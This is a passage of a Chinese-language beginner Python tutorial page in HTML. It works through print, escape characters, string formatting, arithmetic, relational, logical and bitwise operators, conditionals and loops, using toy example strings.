&#x27;yield&#x27;]</span><br></pre></td></tr></table></figure>\n<p>建议：见名知意<br>驼峰式：getName，payMoney<br>如果一个名字由多个单词组成，则除第一个单词之外以后的每个单词的首字母大写<br>类：GetName，如果定义类名，每个单词首字母大写<br>下划线式：<br>Python中变量，函数的命名<br>get_name，pay_money</p>\n<p>Python3支持UTF-8字符集，其标识符可以使用UTF-8所能表示的多种语言的字符。<br>Python2.x 对中文支持较差，如果使用中文字符或中文变量，则需要在源程序中第一行添加“#coding:utf-8”，并将源文件保存为UTF-8字符集<br><img src=\"/utf8.jpg\"></p>\n<h2 id=\"Operator-运算符：\"><a href=\"#Operator-运算符：\" class=\"headerlink\" title=\"Operator 运算符：\"></a>Operator 运算符：</h2><p>赋值运算符：<br>算术运算符<br>关系运算符<br>逻辑运算符<br>位运算符</p>\n<p>单词：</p>\n<p>Built-in/ builtins 内置的<br>Raise 抛出<br>Operator 运算符<br>Identity 特点，特征</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># print函数</span><br><span class=\"line\"># 1.用法</span><br><span class=\"line\">print(&#x27;hello world!&#x27;)</span><br><span class=\"line\">name = &#x27;小白&#x27;</span><br><span class=\"line\">print(name)</span><br><span class=\"line\"></span><br><span class=\"line\"># 2.用法：print(name,age,gender)</span><br><span class=\"line\">age = 18</span><br><span class=\"line\">gender = &#x27;boy&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(name,age,gender) # sep默认的分割是空格</span><br><span class=\"line\"></span><br><span class=\"line\"># 3.用法： print(value, value, value,..., sep=&#x27; &#x27;,end=&#x27;\\n&#x27;)</span><br><span class=\"line\">print(name,age,gender,sep=&#x27;_&#x27;) # sep=&#x27;*&#x27; sep=&#x27;$&#x27; sep=&#x27;-&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 转义字符： \\n 换行； \\t 制表符； \\r 回车； \\&#x27;； \\&quot;； \\\\</span><br><span class=\"line\">print(&#x27;hello\\nkitty&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;AAA&#x27;,end=&#x27;&#x27;)</span><br><span class=\"line\">print(&#x27;BBB&#x27;,end=&#x27;&#x27;)</span><br><span class=\"line\">print(&#x27;CCC&#x27;,end=&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;Dear customer:\\n\\tplease click the hyperlinks to activate your account: Activate!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;Dear customer:\\n&#x27;, &#x27;\\tplease click the hyperlinks to activate your account: Activate!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;George says: \\&#x27; I want to eat ice cream! \\&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;George says: &quot;I want to play dinosaur!&quot;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&quot;George says: &#x27;I want to sleep!&#x27;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;hello\\py\\thon&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(r&#x27;hello\\py\\thon&#x27;) # r&#x27;&#x27; raw 原样输出字符串的内容，即使有转义字符也不会转义</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">补充：\\r是Carriage return，“打印头\\光标”回到首行，如果不加\\n直接写\\r那么这行代码就会被覆盖打印。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">字符串：</span><br><span class=\"line\"></span><br><span class=\"line\"># 定义常量</span><br><span class=\"line\"># java: final</span><br><span class=\"line\"># pyrhon:命名的时候，名字是大写</span><br><span class=\"line\"></span><br><span class=\"line\">NAME = &#x27;Jack&#x27;</span><br><span class=\"line\">print(NAME)</span><br><span class=\"line\">print(&#x27;hello&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">value = &#x27;hello&#x27;</span><br><span class=\"line\">print(value)</span><br><span class=\"line\"></span><br><span class=\"line\">value = &#x27;python&#x27;</span><br><span class=\"line\">print(value)</span><br><span class=\"line\"></span><br><span class=\"line\">value = &quot;hello python&quot;</span><br><span class=\"line\">print(value)</span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串表示： &#x27;&#x27;;  &quot;&quot;;  &#x27;&#x27;&#x27; &#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">message = &#x27;[taobao] You are trying using verification code to login, \\nthe code is: 8906,&#x27; \\</span><br><span class=\"line\">\t\t  &#x27;\\nit involves personal account security, so Please keep it confidential.&#x27;</span><br><span class=\"line\">print(message)</span><br><span class=\"line\"></span><br><span class=\"line\">message1 = &#x27;&#x27;&#x27;</span><br><span class=\"line\">[taobao] </span><br><span class=\"line\">You are trying using verification code to login,</span><br><span class=\"line\">the code is: 8906,</span><br><span class=\"line\">it involves personal account security, so Please keep it confidential.</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(message1)</span><br><span class=\"line\"></span><br><span class=\"line\">email_message = &#x27;&#x27;&#x27;</span><br><span class=\"line\">Dear Zhaofei:</span><br><span class=\"line\">\tThe TiktoK account you just registrated has not yet been activated, </span><br><span class=\"line\">please click below links to activate it!</span><br><span class=\"line\">\tClick this: Activate!!!</span><br><span class=\"line\">\tOnce the account is activated, you can watch all the videos online!</span><br><span class=\"line\"></span><br><span class=\"line\">from: Tiktok team</span><br><span class=\"line\">\t </span><br><span class=\"line\">\t date: 2019/05/29</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(email_message)</span><br><span class=\"line\"></span><br><span class=\"line\"># 三引号的作用：1.定义一个变量并赋值字符串时，需要保留字符串的格式的时候使用</span><br><span class=\"line\">#\t\t\t\t  2.作为多行注释的时候使用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">字符串与变量使用：</span><br><span class=\"line\"></span><br><span class=\"line\"># 格式化输出</span><br><span class=\"line\"></span><br><span class=\"line\">person = &#x27;The Great Sage&#x27;</span><br><span class=\"line\">address = &#x27;4 / F, Zhicheng Science and Technology Building, &#x27; \\</span><br><span class=\"line\">\t\t  &#x27;\\nZhongguancun, Haidian District, Beijing&#x27;</span><br><span class=\"line\">phone = &#x27;15858588888&#x27;</span><br><span class=\"line\">num = 5</span><br><span class=\"line\"></span><br><span class=\"line\"># 用&#x27;+&#x27;符号拼接，字符串 + 字符串 --&gt; OK ； 字符串 + 整型 --&gt; TypeError</span><br><span class=\"line\">print(&#x27;The order is addressed to:&#x27;+person+ \\</span><br><span class=\"line\">\t&#x27;\\nReceiver address is:&#x27;+address+ \\</span><br><span class=\"line\">\t&#x27;\\nContacte:&#x27;+phone+&#x27;\\nQuantity of Goods:&#x27;+str(num))</span><br><span class=\"line\"></span><br><span class=\"line\">print()</span><br><span class=\"line\"></span><br><span class=\"line\"># 用%s占位符，后面依序添加对应变量%()</span><br><span class=\"line\">print(&#x27;The order is addressed to:%s, \\</span><br><span class=\"line\">\t\\nReceiver address is:%s, \\nContacte:%s, \\</span><br><span class=\"line\">\t\\nQuantity of Goods:%s&#x27; %(person, address, phone, num))</span><br><span class=\"line\"></span><br><span class=\"line\"># 格式化输出：%s  %d  %f</span><br><span class=\"line\"></span><br><span class=\"line\">print()</span><br><span class=\"line\"></span><br><span class=\"line\"># 用f&#x27;...&#123;变量&#125;...&#x27; 格式化输出</span><br><span class=\"line\"></span><br><span class=\"line\">print(f&#x27;The order is addressed to:&#123;person&#125;, \\</span><br><span class=\"line\">\t\\nReceiver address is:&#123;address&#125;, \\nContacte:&#123;phone&#125;, \\</span><br><span class=\"line\">\t\\nQuantity of Goods:&#123;num&#125;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：打印个人信息</span><br><span class=\"line\"></span><br><span class=\"line\">name = &#x27;admin&#x27;</span><br><span class=\"line\">age = 18</span><br><span class=\"line\">clazz = &#x27;python&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">msg = &#x27;&#x27;&#x27;</span><br><span class=\"line\">Profile:</span><br><span class=\"line\">My name is %s,</span><br><span class=\"line\">I&#x27;m %s years old,</span><br><span class=\"line\">and studying in class %s</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27; %(name, age, clazz)</span><br><span class=\"line\"></span><br><span class=\"line\">print(msg)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">age = 19</span><br><span class=\"line\"># str(int) ---&gt; (int -&gt; str)  强制类型转换</span><br><span class=\"line\">print(&#x27;age is:&#x27;+str(age))</span><br><span class=\"line\">print(&#x27;age is:%s&#x27; % age) # %s --&gt; str简写  底层：str(age)</span><br><span class=\"line\">isMarry=False # 布尔类型  </span><br><span class=\"line\">print(&#x27;Marry or not? Answer:%s&#x27; %isMarry) # str(False) ---&gt; &#x27;False&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># %d  digit  数字</span><br><span class=\"line\">print(&#x27;age is:%d&#x27; % age)</span><br><span class=\"line\"></span><br><span class=\"line\">age = &#x27;18&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;age is:%d&#x27; % int(age))</span><br><span class=\"line\"></span><br><span class=\"line\">age = 18.5 # int(18.5) ---&gt; 取整数</span><br><span class=\"line\">print(&#x27;age is:%d&#x27; % age)</span><br><span class=\"line\"></span><br><span class=\"line\">year = 2019</span><br><span class=\"line\">print(&#x27;The year is:%06d&#x27; % year)</span><br><span class=\"line\"></span><br><span class=\"line\"># %f  float 小数点后面的位数， 而且是四舍五入</span><br><span class=\"line\">salary=8899.99</span><br><span class=\"line\">print(&#x27;my salary is:%.2f&#x27; % salary)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串的格式化输出</span><br><span class=\"line\"># 方式：1.使用占位符；2.format()函数</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># format是一个字符串中的函数 &#x27;&#x27;.format()  此处的‘ . ’表示调用</span><br><span class=\"line\">age = 2</span><br><span class=\"line\">s=&#x27;already&#x27;</span><br><span class=\"line\">message = &#x27;George says:I\\&#x27;m &#123;&#125; years old now，&#123;&#125; in kindergarten!&#x27;.format(age,s)</span><br><span class=\"line\">print(message)</span><br><span class=\"line\"></span><br><span class=\"line\">name = &#x27;George&#x27;</span><br><span class=\"line\">age = 3</span><br><span class=\"line\">hobby = &#x27;play dinosaur!&#x27;</span><br><span class=\"line\">money = 5.89</span><br><span class=\"line\"></span><br><span class=\"line\">message = &#x27;&#123;&#125; is &#123;&#125; years old, he likes to &#123;&#125;, \\</span><br><span class=\"line\">\\nand he has &#123;&#125; yuan pocket money&#x27;.format(name,age,hobby,money)</span><br><span class=\"line\"></span><br><span class=\"line\">print(message)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Operator-运算符：-1\"><a href=\"#Operator-运算符：-1\" class=\"headerlink\" title=\"Operator 运算符：\"></a>Operator 运算符：</h2><p>赋值运算符：<br>算术运算符<br>关系运算符<br>逻辑运算符<br>位运算符</p>\n<h3 id=\"一，-赋值运算符\"><a href=\"#一，-赋值运算符\" class=\"headerlink\" title=\"一， 赋值运算符\"></a>一， 赋值运算符</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 1. = </span><br><span class=\"line\">name = &#x27;admin&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">name1 = name</span><br><span class=\"line\"></span><br><span class=\"line\">print(id(name),name)</span><br><span class=\"line\">print(id(name1),name1)</span><br><span class=\"line\"></span><br><span class=\"line\"># id() 返回内存地址</span><br><span class=\"line\"></span><br><span class=\"line\"># 扩展后的赋值符号： +=  -=  *=  /=  ....</span><br><span class=\"line\"></span><br><span class=\"line\">num = 8</span><br><span class=\"line\">num += 5  # num = num + 5  此时的+表示数学加号</span><br><span class=\"line\">print(num)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">a=&#x27;abc&#x27;</span><br><span class=\"line\">a +=&#x27;ff&#x27;  # a = a + &#x27;ff&#x27;  此时的+表示连接符</span><br><span class=\"line\">print(a)</span><br><span class=\"line\"></span><br><span class=\"line\"># -=, *=, /= 只应用在数值，字符串不支持</span><br></pre></td></tr></table></figure>\n<h3 id=\"二，-算术运算符\"><a href=\"#二，-算术运算符\" class=\"headerlink\" title=\"二，+ - * / 算术运算符\"></a>二，+ - * / 算术运算符</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 扩展的算术运算符: **  //  %</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;*&#x27; * 10) # 输出成倍字符串</span><br><span class=\"line\"></span><br><span class=\"line\">a=8</span><br><span class=\"line\">b=2</span><br><span class=\"line\"></span><br><span class=\"line\">result = a ** b  # 次方/幂计算</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">result = a // b # 整除</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"三，关系运算符-gt-lt-gt-lt\"><a href=\"#三，关系运算符-gt-lt-gt-lt\" class=\"headerlink\" title=\"三，关系运算符 &gt;  &lt;  &gt;= &lt;=  ==  !=\"></a>三，关系运算符 &gt;  &lt;  &gt;= &lt;=  ==  !=</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">m1=&#x27;hello&#x27;</span><br><span class=\"line\">m2=&#x27;hello&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">result= m1==m2</span><br><span class=\"line\">print(&#x27;m1==m2&#x27;, result)</span><br><span class=\"line\"></span><br><span class=\"line\">result= m1 != m2</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># is  用于对象/内存地址的比较</span><br><span class=\"line\"></span><br><span class=\"line\">age=20</span><br><span class=\"line\"></span><br><span class=\"line\">age1=20</span><br><span class=\"line\"></span><br><span class=\"line\">print(id(age))</span><br><span class=\"line\">print(id(age1))</span><br><span class=\"line\"></span><br><span class=\"line\">print(age is age1)</span><br><span class=\"line\"></span><br><span class=\"line\">money=2000000</span><br><span class=\"line\">salary=600000</span><br><span class=\"line\"></span><br><span class=\"line\">print(id(money))</span><br><span class=\"line\">print(id(salary))</span><br><span class=\"line\"></span><br><span class=\"line\">print(money is salary)</span><br><span class=\"line\"></span><br><span class=\"line\">大整数对象池。说明：终端是每次执行一次，所以每次的大整数都重新创建，而在pycharm中，每次运行是所有代码都加载都内存中，属于一个整体，所以</span><br><span class=\"line\"> 这个时候会有一个大整数对象池，即处于一个代码块的大整数是同一个对象。</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; money=2000000</span><br><span class=\"line\">&gt;&gt;&gt; id(money)</span><br><span class=\"line\">12271392</span><br><span class=\"line\">&gt;&gt;&gt; salary=2000000</span><br><span class=\"line\">&gt;&gt;&gt; id(salary)</span><br><span class=\"line\">12271456</span><br><span class=\"line\">&gt;&gt;&gt; money is salary</span><br><span class=\"line\">False</span><br><span class=\"line\">&gt;&gt;&gt; age=8</span><br><span class=\"line\">&gt;&gt;&gt; id(age)</span><br><span class=\"line\">1446815776</span><br><span class=\"line\">&gt;&gt;&gt; age1=8</span><br><span class=\"line\">&gt;&gt;&gt; id(age1)</span><br><span class=\"line\">1446815776</span><br><span class=\"line\">&gt;&gt;&gt; age is age1</span><br><span class=\"line\">True</span><br><span class=\"line\">&gt;&gt;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Python 对小整数的定义是 [-5, 256] 这些整数对象是提前建立好的，不会被垃圾回收。</span><br></pre></td></tr></table></figure>\n<h3 id=\"四，逻辑运算符-and-or-not\"><a href=\"#四，逻辑运算符-and-or-not\" class=\"headerlink\" title=\"四，逻辑运算符 and   or   not\"></a>四，逻辑运算符 and   or   not</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#逻辑与</span><br><span class=\"line\">#逻辑或</span><br><span class=\"line\">#逻辑非</span><br><span class=\"line\"></span><br><span class=\"line\"># 逻辑运算符的运算结果也是返回True  False</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"位运算\"><a href=\"#位运算\" class=\"headerlink\" title=\"位运算\"></a>位运算</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 二进制： 0  1</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">      1   1</span><br><span class=\"line\"></span><br><span class=\"line\">8  4  2   1</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">a=3</span><br><span class=\"line\">print(bin(a)) #输出 0b 11</span><br><span class=\"line\"></span><br><span class=\"line\">a=13</span><br><span class=\"line\">print(bin(a)) # 0b 1101</span><br><span class=\"line\"></span><br><span class=\"line\">b=0b10111  # 0b 表示二进制</span><br><span class=\"line\">print(int(b)) # int()转十进制</span><br><span class=\"line\"></span><br><span class=\"line\">c=-8</span><br><span class=\"line\">print(bin(c)) # -0b1000</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">-5</span><br><span class=\"line\">5: 0000   0  1  0  1</span><br><span class=\"line\">取反（反码）： 1111  1  0  1  0</span><br><span class=\"line\">加1： 1111  1 0 1 1</span><br><span class=\"line\">字节byte:</span><br><span class=\"line\">0000 0101</span><br><span class=\"line\">一个字节(byte)表示8个二进制位(bit)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">c= 0o6430  # 0o 开头的都是八进制</span><br><span class=\"line\">print(int(c))</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">n= 0o6430</span><br><span class=\"line\"></span><br><span class=\"line\">6       4       3       0</span><br><span class=\"line\"></span><br><span class=\"line\">8^3     8^2     8^1     8^0   转十进制： 6*512+4*64+3*8+0=3352</span><br><span class=\"line\"></span><br><span class=\"line\">110     100     011     000   转二进制： 110100011000</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 0x开头表示十六进制  0-9  a-f</span><br><span class=\"line\">d= 0x9ab16</span><br><span class=\"line\">print(int(d))</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">n=0x9ab16</span><br><span class=\"line\"></span><br><span class=\"line\">9        a        b        1         6</span><br><span class=\"line\"></span><br><span class=\"line\">1001    1010     1011     0001     0110  # 十六进制转二进制</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">&amp;</span><br><span class=\"line\">|</span><br><span class=\"line\">!(~)</span><br><span class=\"line\">^</span><br><span class=\"line\">&lt;&lt;</span><br><span class=\"line\">&gt;&gt;</span><br><span class=\"line\">位运算符</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(3 &amp; 2)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">&amp; 与运算  类似 and</span><br><span class=\"line\">1:True   0:False</span><br><span class=\"line\">  </span><br><span class=\"line\">  0000 0011</span><br><span class=\"line\">&amp; 0000 0010</span><br><span class=\"line\">------------</span><br><span class=\"line\">  0000 0010</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> | 或运算  类似 or</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(5 | 3)</span><br><span class=\"line\"></span><br><span class=\"line\">print(~5) # 取反 将十进制的数字对应的二进制进行取反操作</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">  0000 0101</span><br><span class=\"line\"> 取反：</span><br><span class=\"line\">  1111 1010</span><br><span class=\"line\"> 看第一位（第一位是符号位，只要第一位是1就是负数，第一位是0就是正数）</span><br><span class=\"line\"></span><br><span class=\"line\">  1111 1001 # 减一</span><br><span class=\"line\"></span><br><span class=\"line\">  0000 0110 # 取反</span><br><span class=\"line\">      4+2=6 # 转换十进制</span><br><span class=\"line\">      结合前面得出的是负数，结果为-6</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 异或 ^   相同的是0，不同的是1</span><br><span class=\"line\"></span><br><span class=\"line\">print(3 ^ 5)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">3   0000 0011</span><br><span class=\"line\">5   0000 0101</span><br><span class=\"line\">--------------</span><br><span class=\"line\">\t0000 0110 = 6</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 左移 &lt;&lt;</span><br><span class=\"line\"></span><br><span class=\"line\">print(2&lt;&lt;1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(2&gt;&gt;1)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">2  0000 0010</span><br><span class=\"line\">   0000 0100 左移一位，右侧补0：4</span><br><span class=\"line\">   左移： m&lt;&lt;n --&gt; m*(2的n次方)</span><br><span class=\"line\"></span><br><span class=\"line\">   0000 0010</span><br><span class=\"line\">   0000 0001 右移一位，左侧符号位补0：1</span><br><span class=\"line\">   右移： m&gt;&gt;n --&gt; m//(2的n次方)取整</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(-0b1000000) # -64</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三目运算符\"><a href=\"#三目运算符\" class=\"headerlink\" title=\"三目运算符\"></a>三目运算符</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 格式:结果 if 表达式 else 结果</span><br><span class=\"line\">a=6</span><br><span class=\"line\">b=5</span><br><span class=\"line\">result=(a+b) if a&lt;b else (b-a) # 表达式为True取if前面的结果，否则取else后面的结果</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 运算符的优先级</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"> 排序：</span><br><span class=\"line\">**</span><br><span class=\"line\">~</span><br><span class=\"line\">+ - （符号运算符）</span><br><span class=\"line\">* / // %</span><br><span class=\"line\">+ - 加减</span><br><span class=\"line\">&lt;&lt; &gt;&gt;</span><br><span class=\"line\">&amp;</span><br><span class=\"line\">^</span><br><span class=\"line\">|</span><br><span class=\"line\">== != &gt; &gt;= &lt; &lt;=</span><br><span class=\"line\">is  is not</span><br><span class=\"line\">not</span><br><span class=\"line\">and</span><br><span class=\"line\">or</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 输入: input()函数</span><br><span class=\"line\"># 所输入的都是字符串类型</span><br><span class=\"line\">name = input(&#x27;please input the name: &#x27;) # 阻塞式</span><br><span class=\"line\"></span><br><span class=\"line\">print(name)</span><br></pre></td></tr></table></figure>\n\n\n<p>变量<br>运算符<br>语句：<br>条件判断语句<br>for循环语句<br>跳转语句</p>\n<h2 id=\"条件语句：\"><a href=\"#条件语句：\" class=\"headerlink\" title=\"条件语句：\"></a>条件语句：</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">应用场景： </span><br><span class=\"line\">1. 用户名和密码登录</span><br><span class=\"line\">2. 用户登录验证（看影院信息，判断用户是否登录，没登录则弹出窗口，已登录则看到信息）</span><br><span class=\"line\"></span><br><span class=\"line\">if 条件：</span><br><span class=\"line\">\t条件成立执行的语句</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">username=&#x27;admin&#x27; # 没有登录</span><br><span class=\"line\"># python：判断的变量是：&#x27;&#x27;，0，None 默认是False，否则为True</span><br><span class=\"line\"></span><br><span class=\"line\">if username!=&#x27;&#x27;:</span><br><span class=\"line\">\tprint(&#x27;login success&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-&#x27; *20)</span><br><span class=\"line\"></span><br><span class=\"line\">num=9</span><br><span class=\"line\"></span><br><span class=\"line\">if num: # 等效if num!=0:</span><br><span class=\"line\">\tprint(&#x27;--&#x27; *20, &#x27;&gt;&#x27;, num, sep=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 需求：判断年龄是否大于18，并且判断是否输入了用户名，</span><br><span class=\"line\"># 条件满足则打印xxx今年xxx岁</span><br><span class=\"line\"></span><br><span class=\"line\">age= int(input(&#x27;please input your age: &#x27;))</span><br><span class=\"line\">username= input(&#x27;please input your username: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">if age&gt;19 and username:</span><br><span class=\"line\">\tprint(&#x27;&#123;&#125; is &#123;&#125; years old&#x27;.format(username,age))</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;---game over---&#x27;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># if...else...</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">消消乐：</span><br><span class=\"line\">\tlv1</span><br><span class=\"line\">\tlv2</span><br><span class=\"line\">\t....</span><br><span class=\"line\"></span><br><span class=\"line\">  lv1: 免费玩，随便玩</span><br><span class=\"line\">  lv2: 充值  买道具  随便玩</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(&#x27;*&#x27; *10, &#x27;welcome to game &quot;Eliminate all&quot;&#x27;, &#x27;*&#x27; *10)</span><br><span class=\"line\">level = input(&#x27;please input your level(lv1, lv2): &#x27;)</span><br><span class=\"line\">if level == &#x27;lv1&#x27;:</span><br><span class=\"line\">\tprint(&#x27;play for free and play to your hearts content&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;Pay-per-view level, please pay to continue&#x27;)</span><br><span class=\"line\">\tmoney = int(input(&#x27;click here to pay(In multiples of 100): &#x27;))</span><br><span class=\"line\">\t# if嵌套</span><br><span class=\"line\">\tif money%100==0 and money&gt;0:</span><br><span class=\"line\">\t\tprint(&#x27;Recharge success, Recharge amount is&#x27;, money)</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\tprint(&#x27;Recharge fail, recharge amount has to be multiples of 100!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 随机数</span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">print(random.randint(1,10))</span><br><span class=\"line\"></span><br><span class=\"line\"># 需求：猜大小</span><br><span class=\"line\"></span><br><span class=\"line\">ran = random.randint(1,10)</span><br><span class=\"line\">num = int(input(&#x27;please input a number: &#x27;))</span><br><span class=\"line\">if ran == num:</span><br><span class=\"line\">\tprint(&#x27;Good guess! You are right!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;Guess wrong! Next time!&#x27;)</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 多层条件判断：if...elif...else</span><br><span class=\"line\">age = 30</span><br><span class=\"line\">if age &lt;=18 and age &gt; 0:</span><br><span class=\"line\">\tprint(&#x27;Bingo, good instinct!&#x27;)</span><br><span class=\"line\">elif age &gt; 18 and age &lt;=30:</span><br><span class=\"line\">\tprint(&#x27;I\\&#x27;m still a baby!&#x27;)</span><br><span class=\"line\">elif age &gt; 30 and age &lt;= 40:</span><br><span class=\"line\">\tprint(&#x27;What a young man you are!&#x27;)</span><br><span class=\"line\">else:</span><br><span class=\"line\">\tprint(&#x27;System wrong!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">语法：</span><br><span class=\"line\"></span><br><span class=\"line\">for 变量名 in 集合：</span><br><span class=\"line\">\t语句</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 使用range(start, end, step)函数完成范围指定</span><br><span class=\"line\"># 默认从0开始，不包含结尾数字，步长为1</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(4):</span><br><span class=\"line\">\tif i == 2:</span><br><span class=\"line\">\t\tprint(&#x27;a&#x27;)</span><br><span class=\"line\">\t\tbreak</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\tprint(i)</span><br><span class=\"line\">print(&#x27;finish&#x27;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"循环语句\"><a href=\"#循环语句\" class=\"headerlink\" title=\"循环语句\"></a>循环语句</h2><h3 id=\"需求：打印1-30之间的数字，并且是3和5的倍数\"><a href=\"#需求：打印1-30之间的数字，并且是3和5的倍数\" class=\"headerlink\" title=\"需求：打印1-30之间的数字，并且是3和5的倍数\"></a>需求：打印1-30之间的数字，并且是3和5的倍数</h3><figure 